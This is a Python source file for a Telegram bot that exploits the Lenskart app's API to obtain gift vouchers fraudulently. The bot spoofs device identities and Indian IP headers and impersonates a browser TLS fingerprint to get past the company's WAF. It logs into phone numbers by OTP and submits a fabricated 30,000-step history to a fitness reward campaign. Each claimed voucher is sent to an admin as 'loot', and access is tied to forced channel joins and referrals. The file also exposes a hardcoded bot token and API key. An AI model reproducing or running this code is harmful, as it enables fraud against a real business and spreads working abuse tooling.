#!/usr/bin/env python3
"""
LENSKART PRO - TELEGRAM CLOUD BOT (Railway Ready V5.1 - WAF Bypass & Error Logging)
Features: Daily Limits, 5 Referrals for 30m VIP, God Mode Admin, Indian IP Spoofing, UI Buttons, Robust Error Handling
"""

import telebot
from telebot import types
import json
import random
import time
import uuid
import hashlib
import base64
import os
from datetime import datetime
from curl_cffi import requests

# ==========================================
# 🚨 BOT CONFIGURATION
# ==========================================
BOT_TOKEN = "8860940593:AAFQVyXXU6MHS0OCpLZZ7wEVc33m-PO_IDI"
ADMIN_CHAT_ID = 6860106371

bot = telebot.TeleBot(BOT_TOKEN)
bot_info = bot.get_me()
BOT_USERNAME = bot_info.username

user_sessions = {}
DB_FILE = "users_db.json"
LEADERBOARD_FILE = "leaderboard.json"

# ==========================================
# 📢 FORCE JOIN CONFIGURATION
# ==========================================
REQUIRED_CHATS = [
    {"name": "Rose Khudka Group", "url": "https://t.me/rosekhudkabanaya", "id": "@rosekhudkabanaya"},
    {"name": "Leak Method Free", "url": "https://t.me/leakmethodfree", "id": "@leakmethodfree"},
    {"name": "Sabki Jay Ho Khush", "url": "https://t.me/sabkijayhokhush", "id": "@sabkijayhokhush"}
]

def check_membership(user_id):
    if user_id == ADMIN_CHAT_ID: return True
    for chat in REQUIRED_CHATS:
        try:
            status = bot.get_chat_member(chat['id'], user_id).status
            if status in ['left', 'kicked']:
                return False
        except Exception:
            return False
    return True

# ==========================================
# 💾 DATABASE & LIMITS ENGINE
# ==========================================
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

def check_user_limit(user_id):
    if user_id == ADMIN_CHAT_ID:
        return True, "Admin"
        
    data = load_db()
    user = data.get(str(user_id), {})
    today = datetime.now().strftime("%Y-%m-%d")
    
    vip_until = user.get("vip_until", 0)
    if time.time() < vip_until:
        remaining = int((vip_until - time.time()) / 60)
        return True, f"VIP Active ({remaining} mins left)"
        
    last_date = user.get("last_date", "")
    used_today = user.get("used_today", 0)
    
    if last_date != today:
        return True, "Daily Allowed"
    elif used_today < 1:
        return True, "Daily Allowed"
        
    return False, "Limit Exceeded"

def record_usage(user_id):
    if user_id == ADMIN_CHAT_ID: return
    data = load_db()
    uid = str(user_id)
    today = datetime.now().strftime("%Y-%m-%d")
    
    if uid not in data:
        data[uid] = {"used_today": 0, "last_date": today, "referrals": 0, "vip_until": 0}
        
    user = data[uid]
    if user.get("last_date") != today:
        user["used_today"] = 0
        user["last_date"] = today
        
    if time.time() > user.get("vip_until", 0):
        user["used_today"] += 1
        
    save_db(data)

def add_referral(referrer_id, new_user_id):
    referrer_id = str(referrer_id)
    new_user_id = str(new_user_id)
    if referrer_id == new_user_id: return
    
    data = load_db()
    if referrer_id not in data:
        data[referrer_id] = {"used_today": 0, "last_date": "", "referrals": 0, "vip_until": 0}
        
    if new_user_id not in data:
        data[referrer_id]["referrals"] += 1
        data[new_user_id] = {"used_today": 0, "last_date": "", "referrals": 0, "vip_until": 0}
        
        if data[referrer_id]["referrals"] >= 5:
            data[referrer_id]["referrals"] = 0 
            data[referrer_id]["vip_until"] = time.time() + 1800 
            try:
                bot.send_message(int(referrer_id), "🎉 <b>BOOM!</b> You reached 5 referrals.\n⏱️ <b>30 MINUTES UNLIMITED VIP UNLOCKED!</b> Go crazy!", parse_mode="HTML")
            except: pass
            
    save_db(data)

def get_leaderboard():
    if os.path.exists(LEADERBOARD_FILE):
        try:
            with open(LEADERBOARD_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def update_score(user_id, name):
    user_id = str(user_id)
    data = get_leaderboard()
    if user_id not in data: data[user_id] = {"name": name, "score": 0}
    data[user_id]["score"] += 1
    data[user_id]["name"] = name 
    with open(LEADERBOARD_FILE, "w") as f: json.dump(data, f, indent=4)

# ==========================================
# 📱 ADVANCED STEALTH ENGINE (ANTI-BAN)
# ==========================================
BRANDS = ["xiaomi", "realme", "samsung", "oneplus", "vivo", "motorola", "iqoo"]
MODELS = {"xiaomi": ["Mi 11X", "2201116PI"], "samsung": ["SM-G998B", "SM-S918B"], "oneplus": ["LE2115", "CPH2447"]}
ANDROID_VERSIONS = ["12", "13", "14"]

def generate_indian_ip():
    return f"{random.choice([103, 106, 122, 157])}.{random.randint(10, 250)}.{random.randint(10, 250)}.{random.randint(10, 250)}"

class LenskartFakeDevice:
    def __init__(self, phone: str):
        self.phone = phone
        self.brand = random.choice(BRANDS)
        self.model = random.choice(MODELS.get(self.brand, ["RMX3031"]))
        self.android_version = random.choice(ANDROID_VERSIONS)
        self.udid = uuid.uuid4().hex[:16]
        self.advertising_id = str(uuid.uuid4())
        self.build_version = f"TP1A.220905.00{random.randint(1,9)}"
        self.session_token = None
        
        # Upgraded TLS Impersonation (chrome116)
        self.s = requests.Session(impersonate="chrome116")
        self.fake_ip = generate_indian_ip()
        self.x_assertion = self.generate_x_assertion()
        
    def generate_x_assertion(self):
        data = f"{self.udid}:{self.advertising_id}:{self.brand}:{self.model}:{self.phone}"
        assertion = base64.b64encode(hashlib.sha256(data.encode()).digest()).decode('utf-8').replace('+', '-').replace('/', '_')
        while len(assertion) < 100: assertion += random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_")
        return assertion[:100]
        
    def base_headers(self):
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json; charset=UTF-8",
            "api_key": "valyoo123",
            "x-api-client": "android",
            "x-app-version": "5.8.2 (260713001)",
            "appversion": "5.8.2 (260713001)",
            "X-Build-Version": "260713001",
            "x-country-code": "IN",
            "x-accept-language": "en",
            "udid": self.udid,
            "uniqueId": self.advertising_id[:16],
            "brand": self.brand,
            "model": self.model,
            "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.model} Build/{self.build_version})",
            "X-Forwarded-For": self.fake_ip,
            "X-Real-IP": self.fake_ip
        }
        if self.phone:
            h["x-customer-phone"] = self.phone
            h["x-customer-phone-code"] = "91"
        if self.session_token:
            h["x-session-token"] = self.session_token
        if self.x_assertion:
            h["x-assertion"] = self.x_assertion
        return h

    def req(self, method, path, body=None):
        url = f"https://api-gateway.juno.lenskart.com{path}"
        try:
            time.sleep(random.uniform(0.1, 0.5))
            if method == "POST": 
                return self.s.post(url, headers=self.base_headers(), json=body, timeout=20)
            else: 
                return self.s.get(url, headers=self.base_headers(), timeout=20)
        except Exception as e:
            # Custom mock response to ensure error is passed to the bot UI
            class FakeResponse:
                status_code = 500
                text = f"Exception: {str(e)}"
                def json(self): return {}
            return FakeResponse()

# ==========================================
# 🤖 BOT UI & HANDLERS
# ==========================================

def get_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    b1 = types.InlineKeyboardButton("🎁 Claim Coupon", callback_data="claim")
    b2 = types.InlineKeyboardButton("👥 My Referrals", callback_data="ref")
    b3 = types.InlineKeyboardButton("🏆 Leaderboard", callback_data="lead")
    markup.add(b1, b2, b3)
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if len(message.text.split()) > 1:
        referrer = message.text.split()[1]
        add_referral(referrer, user_id)
    
    if not check_membership(user_id):
        markup = types.InlineKeyboardMarkup()
        for chat in REQUIRED_CHATS:
            markup.add(types.InlineKeyboardButton(text=f"📢 Join {chat['name']}", url=chat['url']))
        markup.add(types.InlineKeyboardButton(text="✅ I Have Joined", callback_data="check_join"))
        
        bot.send_message(chat_id, "⚠️ <b>ACCESS DENIED</b> ⚠️\n\nAapko humare premium bot use karne ke liye pehle niche diye gaye sabhi Channels join karne padenge!", parse_mode="HTML", reply_markup=markup)
        return

    msg = (
        f"🚀 <b>Welcome to Lenskart Pro Bot!</b> 🚀\n\n"
        f"Hello {message.from_user.first_name}, get your free Lenskart coupons here.\n"
        f"• Limit: 1 Coupon / Day\n"
        f"• Need more? Invite friends!\n\n"
        f"<i>Select an option below to begin:</i>"
    )
    bot.send_message(chat_id, msg, parse_mode="HTML", reply_markup=get_main_menu())

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    
    if call.data == "check_join":
        if check_membership(user_id):
            bot.delete_message(chat_id, call.message.message_id)
            bot.send_message(chat_id, "🎉 <b>Thanks for joining!</b>", parse_mode="HTML", reply_markup=get_main_menu())
        else:
            bot.answer_callback_query(call.id, "❌ You haven't joined all channels yet!", show_alert=True)
            
    elif call.data == "claim":
        if not check_membership(user_id):
            bot.answer_callback_query(call.id, "Please join channels first /start", show_alert=True)
            return
            
        allowed, reason = check_user_limit(user_id)
        if not allowed:
            ref_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
            bot.edit_message_text(f"❌ <b>Daily Limit Exceeded!</b>\n\nYou can only claim 1 coupon per day.\n\n🔥 <b>WANT 30 MINS UNLIMITED ACCESS?</b>\nShare this link with 5 friends. Once they start the bot, your VIP will activate automatically:\n\n👉 <code>{ref_link}</code>", chat_id, call.message.message_id, parse_mode="HTML", reply_markup=get_main_menu())
            return
            
        user_sessions[chat_id] = {"step": "wait_for_phone"}
        bot.edit_message_text(f"✅ <b>Status: {reason}</b>\n\n📱 <b>Send me the 10-digit Mobile Number:</b>", chat_id, call.message.message_id, parse_mode="HTML")

    elif call.data == "ref":
        data = load_db()
        user = data.get(str(user_id), {})
        refs = user.get("referrals", 0)
        vip = user.get("vip_until", 0)
        
        status = "🔴 Inactive"
        if time.time() < vip:
            status = f"🟢 VIP Active ({int((vip - time.time())/60)} mins)"
            
        ref_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
        msg = f"👥 <b>Your Referral Stats</b>\n━━━━━━━━━━━━━━\n• Current Referrals: <b>{refs}/5</b>\n• VIP Status: {status}\n\n🔗 <b>Your Link:</b> <code>{ref_link}</code>\n\n<i>Get 5 friends to start the bot and win 30 mins of unlimited claims!</i>"
        bot.edit_message_text(msg, chat_id, call.message.message_id, parse_mode="HTML", reply_markup=get_main_menu())

    elif call.data == "lead":
        data = get_leaderboard()
        if not data:
            bot.edit_message_text("😔 <b>Leaderboard is empty!</b>", chat_id, call.message.message_id, parse_mode="HTML", reply_markup=get_main_menu())
            return
            
        sorted_users = sorted(data.values(), key=lambda x: x['score'], reverse=True)
        board = "🏆 <b>TOP LENSKART LOOTERS</b> 🏆\n━━━━━━━━━━━━━━━━━━━━━\n"
        for i, u in enumerate(sorted_users[:10]):
            medal = ["🥇", "🥈", "🥉"][i] if i < 3 else "🏅"
            board += f"{medal} <b>{u['name']}</b> - {u['score']}\n"
        bot.edit_message_text(board, chat_id, call.message.message_id, parse_mode="HTML", reply_markup=get_main_menu())

@bot.message_handler(func=lambda message: True)
def process_steps(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    text = message.text.strip()
    
    step = user_sessions.get(chat_id, {}).get("step")

    # PHONE SUBMITTED
    if step == "wait_for_phone":
        allowed, _ = check_user_limit(user_id)
        if not allowed:
            bot.send_message(chat_id, "❌ Your daily limit is over. Click My Referrals to unlock VIP.", reply_markup=get_main_menu())
            del user_sessions[chat_id]
            return
            
        if not text.isdigit() or len(text) != 10:
            bot.send_message(chat_id, "❌ Invalid Number! Enter 10-digit number:")
            return
            
        msg = bot.send_message(chat_id, "⏳ <i>Injecting Stealth IPs & Bypassing WAF...</i>", parse_mode="HTML")
        device = LenskartFakeDevice(text)
        
        r = device.req("POST", "/v2/sessions", {})
        
        # 🚨 ROBUST ERROR HANDLING ADDED HERE
        if not r or r.status_code != 200:
            error_details = r.text[:200] if hasattr(r, 'text') else "No response from server"
            status_code = r.status_code if hasattr(r, 'status_code') else 'N/A'
            
            error_msg = (
                f"❌ <b>Lenskart Server Blocked.</b>\n\n"
                f"⚠️ <b>Status Code:</b> {status_code}\n"
                f"🛠 <b>WAF Response:</b> <code>{error_details}</code>"
            )
            bot.edit_message_text(error_msg, chat_id, msg.message_id, parse_mode="HTML")
            del user_sessions[chat_id]
            return
            
        device.session_token = r.json().get("result", {}).get("id")
        r = device.req("POST", "/v3/customers/sendOtp", {"phoneCode": "+91", "telephone": device.phone})
        
        if r and r.status_code == 200:
            user_sessions[chat_id] = {"step": "wait_for_otp", "device": device}
            bot.edit_message_text(f"✅ OTP sent to {text} using IP {device.fake_ip}!\n\n🔑 <b>Please enter the OTP:</b>", chat_id, msg.message_id, parse_mode="HTML")
        else:
            bot.edit_message_text(f"❌ Failed to send OTP. Status: {r.status_code if hasattr(r, 'status_code') else 'N/A'}", chat_id, msg.message_id)
            del user_sessions[chat_id]
            
    # OTP SUBMITTED
    elif step == "wait_for_otp":
        if not text.isdigit() or len(text) < 4:
            bot.send_message(chat_id, "❌ Invalid OTP Format!")
            return
            
        device = user_sessions[chat_id]["device"]
        phone = device.phone
        msg = bot.send_message(chat_id, "⏳ <i>Verifying OTP & Hacking 30,000 Steps...</i>", parse_mode="HTML")
        
        r = device.req("POST", "/v2/customers/authenticate/mobile", {"code": text, "phoneCode": "+91", "telephone": device.phone})
        if not r or r.status_code != 200:
            err_text = r.text[:100] if hasattr(r, 'text') else "Unknown"
            bot.edit_message_text(f"❌ Incorrect OTP or Blocked!\nError: <code>{err_text}</code>", chat_id, msg.message_id, parse_mode="HTML")
            del user_sessions[chat_id]
            return
            
        res = r.json().get("result", {})
        device.session_token = res.get("token")
        
        today_midnight = int(time.time() * 1000) - (int(time.time() * 1000) % 86400000) - (5.5 * 3600 * 1000)
        payload = [{"distance": 0.0, "steps": 0 if i < 6 else 30000, "timestamp": int(today_midnight - (6-i) * 86400000)} for i in range(7)]
        
        r = device.req("POST", "/v2/customers/bff/campaign/eligibility?campaignName=run-for-frame", payload)
        
        if r and r.status_code == 200:
            data = r.json().get("result", {})
            if data.get("giftVoucher"):
                voucher = data.get("giftVoucher")
                tier = data.get("tier", "Tier_3")
                
                record_usage(user_id)
                update_score(user_id, message.from_user.first_name)
                
                success_msg = f"🎉 <b>COUPON EXTRACTED SUCCESSFULLY!</b> 🎉\n\n📱 <b>Number:</b> <code>{phone}</code>\n🏆 <b>Tier:</b> {tier}\n🎫 <b>Voucher Code:</b> <code>{voucher}</code>\n\n<i>Hit /start to claim more!</i>"
                bot.edit_message_text(success_msg, chat_id, msg.message_id, parse_mode="HTML")
                
                admin_msg = f"🚨 <b>NEW LOOT</b> 🚨\n👤 <b>By:</b> {message.from_user.first_name} (@{message.from_user.username})\n📱 <b>Target:</b> <code>{phone}</code>\n🎫 <b>Voucher:</b> <code>{voucher}</code>\n🛡️ <b>Spoofed IP:</b> <i>{device.fake_ip}</i>"
                try: bot.send_message(ADMIN_CHAT_ID, admin_msg, parse_mode="HTML")
                except: pass
            else:
                bot.edit_message_text(f"⚠️ {data.get('message', 'No reward')}", chat_id, msg.message_id)
        else:
            bot.edit_message_text("❌ Error claiming reward.", chat_id, msg.message_id)
            
        del user_sessions[chat_id]

if __name__ == "__main__":
    print("="*50)
    print("🤖 STARTING V5.1 ULTIMATE CLOUD BOT...")
    print("="*50)
    try: bot.remove_webhook()
    except: pass
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
